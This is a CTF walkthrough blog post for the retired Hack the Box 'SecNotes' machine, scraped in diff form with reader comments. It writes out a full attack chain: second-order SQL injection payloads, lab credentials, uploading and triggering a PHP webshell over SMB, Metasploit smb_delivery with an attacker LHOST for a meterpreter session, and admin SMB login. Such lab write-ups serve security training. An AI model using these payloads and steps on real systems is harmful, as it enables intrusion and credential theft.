@@ -1,0 +1,470 @@
+
+								
+																		Hack the Box: SecNotes Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on January 21, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “SecNotes”. SecNotes is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to their experience. They have a collection of vulnerable labs as challenges; ranging from beginners to expert level.
+Level: Easy
+Task: To find user.txt and root.txt file
+Penetration Methodology:
+
+Scanning Network
+
+
+TCP and UDP ports scanning (nmap).
+
+
+Testing port 80
+
+
+Exploiting 2nd order SQL injection on sign up form.
+Retrieving all the notes in the system.
+Retrieving “tyler’s” account password.
+
+
+SMB (port 445) penetration
+
+
+Accessing victim shell using smbclient.
+Uploading simple-backdoor.php on victim’s machine.
+Triggering backdoor via a browser.
+Exploiting newly created RCE using Metasploit’s smb_delivery exploit.
+Reading the user.txt flag.
+
+
+Privilege Escalation
+
+
+Discovering a Windows Subsystem for Linux (WSL).
+Obtaining bash shell from bash.exe.
+Reading administrator password from bash_history.
+Connecting to Administrator using SMB.
+Reading root.txt flag.
+
+Without any further ado, let’s dive right into it.
+The first step as always is to perform a nmap scan. We performed an all ports system scan here.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -sV 10.10.10.97
+			
+				
+					
+				
+					1
+				
+						nmap -p- -sV 10.10.10.97
+					
+				
+			
+		
+
+That told us there are three ports open:
+80- web server
+445- smb server
+8808- web server
+
+We launched the website on port 80 only to discover a login form.
+After playing around with the page sources and source code checking we didn’t find anything useful.
+
+But there was a sign-up option too. We signed up using a random name and password and it seemed to lead us to an account where you could take notes and delete them and also change the password.
+We tried inserting SQL injection queries in the login form and nothing showed up. Then we tried inserting 2nd order SQL injection which is nothing but inserting SQL injection queries on the sign-up form itself hoping that the server side script shows any unusual behavior and reveals some database information.
+According to PortSwigger: “Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.”
+The query that we used was:
+
+		
+		
+			
+			
+			
+			
+Username: ' or 1='1
+Password: ' or 1='1
+Confirm password: ' or 1='1
+			
+				
+					
+				
+					123
+				
+						Username: ' or 1='1Password: ' or 1='1Confirm password: ' or 1='1
+					
+				
+			
+		
+
+
+It hit successfully and opened up a user account. Seemed like the heading was causing this 2nd order SQLi vulnerability. But it solved our purpose and gave us three notes from the database. The third one had something that seemed like the username and password of a service.
+
+		
+		
+			
+			
+			
+			
+\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&amp;
+			
+				
+					
+				
+					12
+				
+						\\secnotes.htb\new-sitetyler / 92g!mA8BGjOirkL%OG*&amp;
+					
+				
+			
+		
+
+
+Tyler seems to be a person responsible for people’s queries. After obtaining Tyler’s password the first guess was logging into SMB server running on port 445.
+For the purpose we used smbclient. Once we successfully logged into the system we listed the directories using ls command.
+This seems like a different website than the one on port 80. Maybe this is the one on port 8808.
+So, we uploaded a PHP RCE payload called “simple-backdoor.php” that is present in Kali Linux in the directory: “/usr/share/webshells/php” using the put command in smb shell which allows us to run windows commands remotely on the server.
+
+		
+		
+			
+			
+			
+			
+smbclient –L 10.10.10.97 –U tyler
+password: 92g!mA8BGjOirkL%OG*&amp;
+smbclient //10.10.10.97/new-site -U tyler
+Password: 92g!mA8BGjOirkL%OG*&amp;
+ls
+put simple-backdoor.php
+ls
+			
+				
+					
+				
+					1234567
+				
+						smbclient –L 10.10.10.97 –U tylerpassword: 92g!mA8BGjOirkL%OG*&amp;smbclient //10.10.10.97/new-site -U tylerPassword: 92g!mA8BGjOirkL%OG*&amp;lsput simple-backdoor.phpls
+					
+				
+			
+		
+
+
+It was now time to trigger the backdoor we just uploaded to check if RCE is even working or not on the server.
+
+		
+		
+			
+			
+			
+			
+10.10.10.97:8808/simple-backdoor.php?cmd=whoami
+			
+				
+					
+				
+					1
+				
+						10.10.10.97:8808/simple-backdoor.php?cmd=whoami
+					
+				
+			
+		
+
+
+It seems to be working just fine! Now on a new window in the terminal, we run Metasploit.
+We are looking for an exploit called smb_delivery that triggers RCE on windows and gives a meterpreter session.
+This is only one of the multiple ways through which you could exploit SMB. You can explore multiple ways to do so in our article (SMB penetration testing (Port 445)) here.
+So essentially what happens here is that after setting up an LHOST and SRVHOST MSF generates a one-liner that we’ll copy on the RCE vulnerability and will trigger and give us meterpreter.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/smb/smb_delivery
+set LHOST 10.10.14.9
+set SRVHOST 10.10.14.9
+exploit
+			
+				
+					
+				
+					1234
+				
+						use exploit/windows/smb/smb_deliveryset LHOST 10.10.14.9set SRVHOST 10.10.14.9exploit
+					
+				
+			
+		
+
+
+Here, 10.10.14.9 is my local IP.
+Alright, so we did as Metasploit asked us to do and ran the rundll32.exe command on the browser where we had RCE vulnerability.
+
+Side by side, we checked our terminal and we had gained a meterpreter session! To confirm we are in the windows server we ran sysinfo and pwd to check the current directory we are in.
+
+		
+		
+			
+			
+			
+			
+sysinfo
+pwd
+			
+				
+					
+				
+					12
+				
+						sysinfopwd
+					
+				
+			
+		
+
+
+After playing around a while in the machine, we found user.txt on Tyler’s desktop! But we are only half done till now with no clue where to proceed ahead. Although, a file called bash.lnk caught our attention which is a link to bash and this is weird. What is a bash file doing on a windows system? We proceeded to download the link file on our system and read what’s in it.
+
+		
+		
+			
+			
+			
+			
+cd Users
+ls
+cd tyler/Desktop
+cat user.txt
+download bash.lnk /root/
+			
+				
+					
+				
+					12345
+				
+						cd Userslscd tyler/Desktopcat user.txtdownload bash.lnk /root/
+					
+				
+			
+		
+
+
+The language of the link file seemed quite unreadable so we used the strings command to read the bash.lnk file which eventually revealed a link to bash.exe!
+
+		
+		
+			
+			
+			
+			
+strings bash.lnk
+			
+				
+					
+				
+					1
+				
+						strings bash.lnk
+					
+				
+			
+		
+
+
+We thought the path to bash.exe was C:\Windows\System32\bash.exe but it was not! The file was missing from the path. We didn’t want to traverse the whole system manually so instead, we used the where command.
+Where command gave us the exact directory of bash.exe and after executing it, we received an improper teletype of bash!
+We used the python one-liner to spawn a proper teletype and proceeded further to read bash_history.
+It told us in clear text about a user Administrator and its password!
+
+		
+		
+			
+			
+			
+			
+shell
+where /R c:\ bash.exe
+&lt;running the bash.exe&gt;
+id
+ls –la
+cat .bash_history
+			
+				
+					
+				
+					123456
+				
+						shellwhere /R c:\ bash.exe&lt;running the bash.exe&gt;idls –lacat .bash_history
+					
+				
+			
+		
+
+
+It is only obvious now that we have to login to Administrator using smbclient command we found in bash_history to get an admin’s smb shell!
+Final steps: We traversed the directory to Administrator’s desktop and downloaded root.txt using smb’s “get” command. And there it was! The final flag!
+
+		
+		
+			
+			
+			
+			
+smbclient –U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$
+ls
+cd Users/Administrator/Desktop
+ls
+get root.txt
+cat root.txt
+			
+				
+					
+				
+					123456
+				
+						smbclient –U 'administrator%u6!4Zwgw0M#^0Bf#Nwnh' \\\\10.10.10.97\\c$lscd Users/Administrator/Desktoplsget root.txtcat root.txt
+					
+				
+			
+		
+
+
+Hope you enjoyed this walkthrough. Do leave a comment with your thoughts and have a nice day!
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								Manju January 22, 2019 at 3:17 am							
+							
+							
+														
+							
+								Hey, just a small correction. In the description at the beginning, the machine name is mentioned as “Mischief”.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Jay February 7, 2019 at 4:21 pm							
+							
+							
+														
+							
+								Hi Raj,
+I have VIP account. However, I am not able to  ping the retired machines. I see in the VPN connection that there is a route to network 10.10.10.0/24. My IP address is in the range 10.10.14.0/23. I appreciate your feedback.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Raj Chandel February 7, 2019 at 5:02 pm							
+							
+							
+														
+							
+								please contact hackthebox team
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
